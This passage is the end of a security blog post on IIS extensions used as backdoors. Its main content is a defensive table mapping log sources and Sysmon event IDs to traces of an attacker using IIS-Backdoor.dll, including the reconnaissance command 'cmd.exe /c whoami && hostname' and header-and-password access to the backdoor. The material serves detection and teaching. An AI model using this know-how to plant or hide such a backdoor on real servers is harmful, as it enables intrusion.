<h5><span class="ez-toc-section" id="Interact"></span>Interact<span class="ez-toc-section-end"></span></h5>
<p></p>
<table>
<tr>
<td width="20%"><strong>Log/Source</strong></td>
<td width="20%"><strong>Event ID(s)</strong></td>
<td width="60%"><strong>Notes</strong></td>
</tr>
<tr>
<td>IIS logs</td>
<td></td>
<td>Showed the attacker IP, user-agent, uri (/) and method (GET)</td>
</tr>
<tr>
<td>Sysmon/Operational</td>
<td>1 (Process Create)</td>
<td>Captured the command line activity (cmd.exe /c whoami &amp;&amp; hostname) under the IIS worker process (w3wp.exe)</td>
</tr>
<tr>
<td>Packet Capture</td>
<td></td>
<td>Showed how the back door was interacted with (headers and a password) along with the commands and the response that the attacker observed (returned via header/base64 encoded), still no link to local source of activity</td>
</tr>
<tr>
<td>Sysmon/Operational<br>MiniDump</td>
<td>7 (Image Loaded)</td>
<td>Showed all .dlls loaded by w3wp.exe, revealed outlier (IIS-Backdoor.dll) based on ImageLoaded location (only .dll from wwwroot\bin), blank fields (FileVersion, Product, Company, etc), hash, signature</td>
</tr>
<tr>
<td>File</td>
<td></td>
<td>Manual review IIS-Backdoor.dll using basic string analysis revealed links to the cmd.exe usage and the headers found in the packet captures</td>
</tr>
</table>
</div>


<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)"><div class="taxonomy-post_tag is-style-post-terms-1 is-style-post-terms-1--1 wp-block-post-terms"><a href="/tag/detection/" rel="tag">Detection</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/extensions/" rel="tag">Extensions</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/iis/" rel="tag">IIS</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/kali/" rel="tag">Kali</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/logs/" rel="tag">Logs</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/powershell/" rel="tag">Powershell</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/security/" rel="tag">security</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/siem/" rel="tag">SIEM</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/sysmon/" rel="tag">Sysmon</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/web-shell/" rel="tag">Web Shell</a><span class="wp-block-post-terms__separator">  </span><a href="/tag/windows/" rel="tag">Windows</a></div></div>



<div class="wp-block-group alignwide is-layout-flow wp-block-group-is-layout-flow" style="margin-top:var(--wp--preset--spacing--60);margin-bottom:var(--wp--preset--spacing--60)">
<nav class="wp-block-group alignwide is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-9b36172e wp-block-group-is-layout-flex" aria-label="Post navigation" style="border-top-color:var(--wp--preset--color--accent-6);border-top-width:1px;padding-top:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--40)"><div class="post-navigation-link-previous wp-block-post-navigation-link"><span class="wp-block-post-navigation-link__arrow-previous is-arrow-arrow" aria-hidden="true">←</span><a href="/2022/06/powershell-script-invoke-rpcmap/" rel="prev">New Tool! Invoke-RPCMap: PowerShell Script for Remote RPC Service Enumeration</a></div>

<div class="post-navigation-link-next wp-block-post-navigation-link"><a href="/2024/03/powershell-script-invoke-encryptionsimulator/" rel="next">Introducing Invoke-EncryptionSimulator: A PowerShell Tool for Simulating Late-Stage Ransomware Attacks</a><span class="wp-block-post-navigation-link__arrow-next is-arrow-arrow" aria-hidden="true">→</span></div></nav>
</div>


</div>



<div class="wp-block-group alignwide has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)">
<h2 class="wp-block-heading alignwide has-small-font-size" style="font-style:normal;font-weight:700;letter-spacing:1.4px;text-transform:uppercase">More posts</h2>



<div class="wp-block-query alignwide is-layout-flow wp-block-query-is-layout-flow"><ul class="alignfull wp-block-post-template is-layout-flow wp-container-core-post-template-is-layout-3ee800f6 wp-block-post-template-is-layout-flow"><li class="wp-block-post post-7792 post type-post status-publish format-standard has-post-thumbnail hentry category-blog category-computers category-pen-testing category-security category-servers category-software category-tools tag-docker tag-linux tag-onenote tag-self-hosting tag-trilium">

<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)"><h3 class="wp-block-post-title has-large-font-size"><a href="/2026/01/trilium-notes-self-hosted-server-setup/" target="_self">Trilium Notes – Self-Hosted Server Setup</a></h3>

<div class="has-text-align-right wp-block-post-date"><time datetime="2026-01-15T02:56:31-06:00"><a href="/2026/01/trilium-notes-self-hosted-server-setup/">January 15, 2026</a></time></div></div>

</li><li class="wp-block-post post-7703 post type-post status-publish format-standard has-post-thumbnail hentry category-blog category-computers category-pen-testing category-security category-servers category-software category-tools tag-active-directory tag-ad-miner tag-bloodhound tag-blue tag-purple tag-red tag-team">

<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)"><h3 class="wp-block-post-title has-large-font-size"><a href="/2025/12/revisiting-purple-teaming-ad-with-bloodhound-ce-ad-miner/" target="_self">Revisiting Purple Teaming AD with BloodHound CE &amp; AD-Miner</a></h3>

<div class="has-text-align-right wp-block-post-date"><time datetime="2025-12-04T19:07:35-06:00"><a href="/2025/12/revisiting-purple-teaming-ad-with-bloodhound-ce-ad-miner/">December 4, 2025</a></time></div></div>

</li><li class="wp-block-post post-7729 post type-post status-publish format-standard has-post-thumbnail hentry category-blog category-computers category-pen-testing category-security category-software category-tools tag-linux tag-omarchy tag-vmware">

<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)"><h3 class="wp-block-post-title has-large-font-size"><a href="/2025/11/installing-omarchy-on-vmware-workstation/" target="_self">Installing Omarchy On VMware Workstation</a></h3>

<div class="has-text-align-right wp-block-post-date"><time datetime="2025-11-05T05:12:29-06:00"><a href="/2025/11/installing-omarchy-on-vmware-workstation/">November 5, 2025</a></time></div></div>

</li><li class="wp-block-post post-7452 post type-post status-publish format-standard has-post-thumbnail hentry category-ai category-blog category-computers category-pen-testing category-security category-servers tag-dell tag-esxi tag-home-lab tag-linux tag-servers tag-windows">

<div class="wp-block-group alignfull is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-154222c2 wp-block-group-is-layout-flex" style="border-bottom-color:var(--wp--preset--color--accent-6);border-bottom-width:1px;padding-top:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--30)"><h3 class="wp-block-post-title has-large-font-size"><a href="/2025/10/home-lab-office-2025/" target="_self">Home Lab (2025)</a></h3>

<div class="has-text-align-right wp-block-post-date"><time datetime="2025-10-04T18:10:14-05:00"><a href="/2025/10/home-lab-office-2025/">October 4, 2025</a></time></div></div>

</li></ul></div>
</div>
</main>


<footer class="wp-block-template-part">
<div class="wp-block-group alignfull has-background-color is-layout-flow wp-block-group-is-layout-flow" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--30)"><footer class="wp-block-template-part">
<div class="wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-group alignfull has-background-color is-layout-flow wp-block-group-is-layout-flow" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--30);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--30)">
<div class="wp-block-group alignfull has-small-font-size is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-cc97c919 wp-block-group-is-layout-flex"><p class="has-text-align-left wp-block-site-title has-small-font-size wp-container-content-b0223bd5"><a href="/" target="_self" rel="home">RobWillis.info</a></p>


<ul class="wp-block-social-links has-normal-icon-size is-style-logos-only wp-container-content-b0223bd5 is-content-justification-right is-nowrap is-layout-flex wp-container-core-social-links-is-layout-ad1cd33a wp-block-social-links-is-layout-flex"><li class="wp-social-link wp-social-link-twitter  wp-block-social-link"><a rel="https://x.com/b1t_r0t noopener nofollow" target="_blank" href="https://x.com/b1t_r0t" class="wp-block-social-link-anchor"><svg width="24" height="24" viewbox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M22.23,5.924c-0.736,0.326-1.527,0.547-2.357,0.646c0.847-0.508,1.498-1.312,1.804-2.27 c-0.793,0.47-1.671,0.812-2.606,0.996C18.324,4.498,17.257,4,16.077,4c-2.266,0-4.103,1.837-4.103,4.103 c0,0.322,0.036,0.635,0.106,0.935C8.67,8.867,5.647,7.234,3.623,4.751C3.27,5.357,3.067,6.062,3.067,6.814 c0,1.424,0.724,2.679,1.825,3.415c-0.673-0.021-1.305-0.206-1.859-0.513c0,0.017,0,0.034,0,0.052c0,1.988,1.414,3.647,3.292,4.023 c-0.344,0.094-0.707,0.144-1.081,0.144c-0.264,0-0.521-0.026-0.772-0.074c0.522,1.63,2.038,2.816,3.833,2.85 c-1.404,1.1-3.174,1.756-5.096,1.756c-0.331,0-0.658-0.019-0.979-0.057c1.816,1.164,3.973,1.843,6.29,1.843 c7.547,0,11.675-6.252,11.675-11.675c0-0.178-0.004-0.355-0.012-0.531C20.985,7.47,21.68,6.747,22.23,5.924z"></path></svg><span class="wp-block-social-link-label screen-reader-text">Twitter</span></a></li>

<li class="wp-social-link wp-social-link-github  wp-block-social-link"><a rel="https://github.com/robwillisinfo noopener nofollow" target="_blank" href="https://github.com/robwillisinfo" class="wp-block-social-link-anchor"><svg width="24" height="24" viewbox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M12,2C6.477,2,2,6.477,2,12c0,4.419,2.865,8.166,6.839,9.489c0.5,0.09,0.682-0.218,0.682-0.484 c0-0.236-0.009-0.866-0.014-1.699c-2.782,0.602-3.369-1.34-3.369-1.34c-0.455-1.157-1.11-1.465-1.11-1.465 c-0.909-0.62,0.069-0.608,0.069-0.608c1.004,0.071,1.532,1.03,1.532,1.03c0.891,1.529,2.341,1.089,2.91,0.833 c0.091-0.647,0.349-1.086,0.635-1.337c-2.22-0.251-4.555-1.111-4.555-4.943c0-1.091,0.39-1.984,1.03-2.682 C6.546,8.54,6.202,7.524,6.746,6.148c0,0,0.84-0.269,2.75,1.025C10.295,6.95,11.15,6.84,12,6.836 c0.85,0.004,1.705,0.114,2.504,0.336c1.909-1.294,2.748-1.025,2.748-1.025c0.546,1.376,0.202,2.394,0.1,2.646 c0.64,0.699,1.026,1.591,1.026,2.682c0,3.841-2.337,4.687-4.565,4.935c0.359,0.307,0.679,0.917,0.679,1.852 c0,1.335-0.012,2.415-0.012,2.741c0,0.269,0.18,0.579,0.688,0.481C19.138,20.161,22,16.416,22,12C22,6.477,17.523,2,12,2z"></path></svg><span class="wp-block-social-link-label screen-reader-text">GitHub</span></a></li>

<li class="wp-social-link wp-social-link-youtube  wp-block-social-link"><a rel="noopener nofollow" target="_blank" href="https://www.youtube.com/robwillisinfo" class="wp-block-social-link-anchor"><svg width="24" height="24" viewbox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M21.8,8.001c0,0-0.195-1.378-0.795-1.985c-0.76-0.797-1.613-0.801-2.004-0.847c-2.799-0.202-6.997-0.202-6.997-0.202 h-0.009c0,0-4.198,0-6.997,0.202C4.608,5.216,3.756,5.22,2.995,6.016C2.395,6.623,2.2,8.001,2.2,8.001S2,9.62,2,11.238v1.517 c0,1.618,0.2,3.237,0.2,3.237s0.195,1.378,0.795,1.985c0.761,0.797,1.76,0.771,2.205,0.855c1.6,0.153,6.8,0.201,6.8,0.201 s4.203-0.006,7.001-0.209c0.391-0.047,1.243-0.051,2.004-0.847c0.6-0.607,0.795-1.985,0.795-1.985s0.2-1.618,0.2-3.237v-1.517 C22,9.62,21.8,8.001,21.8,8.001z M9.935,14.594l-0.001-5.62l5.404,2.82L9.935,14.594z"></path></svg><span class="wp-block-social-link-label screen-reader-text">YouTube</span></a></li></ul>
</div>
</div>
</div>
</footer></div>
</footer></div>
<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/twentytwentyfive/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
					<div class="ez-toc-sticky ">
						<div class="ez-toc-sticky-fixed hide ez-toc-sticky-grey">
							<div class="ez-toc-sidebar"><div class="ez-toc-sticky-title-container">
<p class="ez-toc-sticky-title" style="cursor:inherit">Table of Contents</p>
<a class="ez-toc-close-icon" href="#" onclick="ezTOC_hideBar(event)" aria-label="×"><span aria-hidden="true">×</span></a>
</div>
<div id="ez-toc-sticky-container" class="ez-toc-sticky-container ez-toc-sticky-v2_0_80 counter-flat ez-toc-sticky-toggle-counter">
<nav class="ez-toc-sticky-toggle-direction"><ul class="ez-toc-sticky-list ez-toc-sticky-list-level-1 "><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-1" href="#IIS_Extensions_As_Backdoors">IIS Extensions As Backdoors</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-2" href="#What_Is_IIS">What Is IIS?</a><ul class="ez-toc-sticky-list-level-4"><li class="ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#IIS_Vulnerabilities_Exploitation">IIS Vulnerabilities &amp; Exploitation</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#IIS_Server_Features_Application_Pool_Settings">IIS Server Features &amp; Application Pool Settings</a></li></ul></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-5" href="#Lab_Setup">Lab Setup</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-6" href="#Web_Shells_vs_IIS_Extensions">Web Shells vs IIS Extensions</a><ul class="ez-toc-sticky-list-level-4"><li class="ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Web_Shells">Web Shells</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#IIS_Extensions">IIS Extensions</a></li></ul></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-9" href="#Compiling_Installing_An_IIS_Extension">Compiling &amp; Installing An IIS Extension</a><ul class="ez-toc-sticky-list-level-4"><li class="ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#IIS-Raid">IIS-Raid</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Compiling_The_Extension">Compiling The Extension</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Uploading_The_Extension">Uploading The Extension</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Installing_The_IIS_Extension_Using_AppCmd">Installing The IIS Extension Using AppCmd</a></li></ul></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-14" href="#Interacting_With_IIS-Raid">Interacting With IIS-Raid</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-15" href="#ImageDLLModule_Loads_%E2%80%93_w3wpexe">Image/DLL/Module Loads – w3wp.exe</a><ul class="ez-toc-sticky-list-level-4"><li class="ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#Method_1_%E2%80%93_Sysmon_Event_ID_7_%E2%80%93_Image_Loaded">Method 1 – Sysmon Event ID 7 – Image Loaded</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#Method_2_%E2%80%93_User_Mode_MiniDump_Task_Manager_Debugger_Visual_Studio">Method 2 – User Mode  MiniDump (Task Manager) &amp; Debugger (Visual Studio)</a></li></ul></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-18" href="#Wrapping_Things_Up%E2%80%A6">Wrapping Things Up…</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-3"><a class="ez-toc-link ez-toc-heading-19" href="#Defensive_Event_Summary">Defensive Event Summary</a><ul class="ez-toc-sticky-list-level-4"><li class="ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#Web_Shell">Web Shell</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#IIS_ExtensionIIS-RaidIIS-Backdoordll">IIS Extension/IIS-Raid/IIS-Backdoor.dll</a><ul class="ez-toc-sticky-list-level-5"><li class="ez-toc-sticky-heading-level-5"><a class="ez-toc-link ez-toc-heading-22" href="#Upload">Upload</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-5"><a class="ez-toc-link ez-toc-heading-23" href="#Install">Install</a></li><li class="ez-toc-sticky-page-1 ez-toc-sticky-heading-level-5"><a class="ez-toc-link ez-toc-heading-24" href="#Interact">Interact</a></li></ul></li></ul></li></ul></nav></div>
</div>
						</div>
						<a class="ez-toc-open-icon" href="#" onclick="ezTOC_showBar(event)">
							<span class="arrow">←</span>
							<span class="text">Table Of Contents</span>
						</a>
					</div>
					<script type="module" src="/wp-includes/js/dist/script-modules/block-library/navigation/view.min.js?ver=b0f909c3ec791c383210" id="@wordpress/block-library/navigation/view-js-module" fetchpriority="low" data-wp-router-options="{&quot;loadOnClientNavigation&quot;:true}"></script>
<script id="wp-block-template-skip-link-js-after">
	( function() {
		var skipLinkTarget = document.querySelector( 'main' ),
			sibling,
			skipLinkTargetID,
			skipLink;

		// Early exit if a skip-link target can't be located.
		if ( ! skipLinkTarget ) {
			return;
		}

		/*
		 * Get the site wrapper.
		 * The skip-link will be injected in the beginning of it.
		 */
		sibling = document.querySelector( '.wp-site-blocks' );

		// Early exit if the root element was not found.
		if ( ! sibling ) {
			return;
		}

		// Get the skip-link target's ID, and generate one if it doesn't exist.
		skipLinkTargetID = skipLinkTarget.id;
		if ( ! skipLinkTargetID ) {
			skipLinkTargetID = 'wp--skip-link--target';
			skipLinkTarget.id = skipLinkTargetID;
		}

		// Create the skip link.
		skipLink = document.createElement( 'a' );
		skipLink.classList.add( 'skip-link', 'screen-reader-text' );
		skipLink.id = 'wp-skip-link';
		skipLink.href = '#' + skipLinkTargetID;
		skipLink.innerText = 'Skip to content';

		// Inject the skip link.
		sibling.parentElement.insertBefore( skipLink, sibling );
	}() );
	
//# sourceURL=wp-block-template-skip-link-js-after
</script>
<script id="lbwps-photoswipe5-js-extra">
var lbwpsOptions = {"label_facebook":"Share on Facebook","label_twitter":"Tweet","label_pinterest":"Pin it","label_download":"Download image","label_copyurl":"Copy image URL","label_ui_close":"Close [Esc]","label_ui_zoom":"Zoom","label_ui_prev":"Previous [\u2190]","label_ui_next":"Next [\u2192]","label_ui_error":"The image cannot be loaded","label_ui_fullscreen":"Toggle fullscreen [F]","label_ui_download":"Download image","share_facebook":"1","share_twitter":"1","share_pinterest":"1","share_download":"1","share_direct":"0","share_copyurl":"0","close_on_drag":"1","history":"1","show_counter":"1","show_fullscreen":"1","show_download":"0","show_zoom":"1","show_caption":"1","loop":"0","pinchtoclose":"1","taptotoggle":"1","close_on_click":"1","fulldesktop":"0","use_alt":"0","usecaption":"1","desktop_slider":"1","share_custom_label":"","share_custom_link":"","wheelmode":"zoom","spacing":"12","idletime":"4000","hide_scrollbars":"1","caption_type":"overlay","bg_opacity":"100","padding_left":"0","padding_top":"0","padding_right":"0","padding_bottom":"0"};
//# sourceURL=lbwps-photoswipe5-js-extra
</script>
<script type="module" src="/wp-content/plugins/lightbox-photoswipe/assets/ps5/frontend.min.js?ver=5.8.2"></script><script id="ez-toc-scroll-scriptjs-js-extra">
var eztoc_smooth_local = {"scroll_offset":"30","add_request_uri":"","add_self_reference_link":""};
//# sourceURL=ez-toc-scroll-scriptjs-js-extra
</script>
<script src="/wp-content/plugins/easy-table-of-contents/assets/js/smooth_scroll.min.js?ver=2.0.80" id="ez-toc-scroll-scriptjs-js"></script>
<script src="/wp-content/plugins/easy-table-of-contents/vendor/js-cookie/js.cookie.min.js?ver=2.2.1" id="ez-toc-js-cookie-js"></script>
<script src="/wp-content/plugins/easy-table-of-contents/vendor/sticky-kit/jquery.sticky-kit.min.js?ver=1.9.2" id="ez-toc-jquery-sticky-kit-js"></script>
<script id="ez-toc-js-js-extra">
var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"","scroll_offset":"30","fallbackIcon":"\u003Cspan class=\"\"\u003E\u003Cspan class=\"eztoc-hide\" style=\"display:none;\"\u003EToggle\u003C/span\u003E\u003Cspan class=\"ez-toc-icon-toggle-span\"\u003E\u003Csvg style=\"fill: #999;color:#999\" xmlns=\"http://www.w3.org/2000/svg\" class=\"list-377408\" width=\"20px\" height=\"20px\" viewBox=\"0 0 24 24\" fill=\"none\"\u003E\u003Cpath d=\"M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z\" fill=\"currentColor\"\u003E\u003C/path\u003E\u003C/svg\u003E\u003Csvg style=\"fill: #999;color:#999\" class=\"arrow-unsorted-368013\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10px\" height=\"10px\" viewBox=\"0 0 24 24\" version=\"1.2\" baseProfile=\"tiny\"\u003E\u003Cpath d=\"M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z\"/\u003E\u003C/svg\u003E\u003C/span\u003E\u003C/span\u003E","chamomile_theme_is_on":""};
//# sourceURL=ez-toc-js-js-extra
</script>
<script src="/wp-content/plugins/easy-table-of-contents/assets/js/front.min.js?ver=2.0.80-1767421590" id="ez-toc-js-js"></script>
<script id="ez-toc-sticky-js-extra">
var eztoc_sticky_local = {"close_on_link_click":""};
//# sourceURL=ez-toc-sticky-js-extra
</script>
<script src="/wp-content/plugins/easy-table-of-contents/assets/js/ez-toc-sticky.min.js?ver=2.0.80-1767421590" id="ez-toc-sticky-js"></script>
<script id="wp-emoji-settings" type="application/json">
{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"/wp-includes/js/wp-emoji-release.min.js?ver=6.9"}}
</script>
<script type="module">
/*! This file is auto-generated */
const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
//# sourceURL=https://robwillis.info/wp-includes/js/wp-emoji-loader.min.js
</script>
</body>
</html>
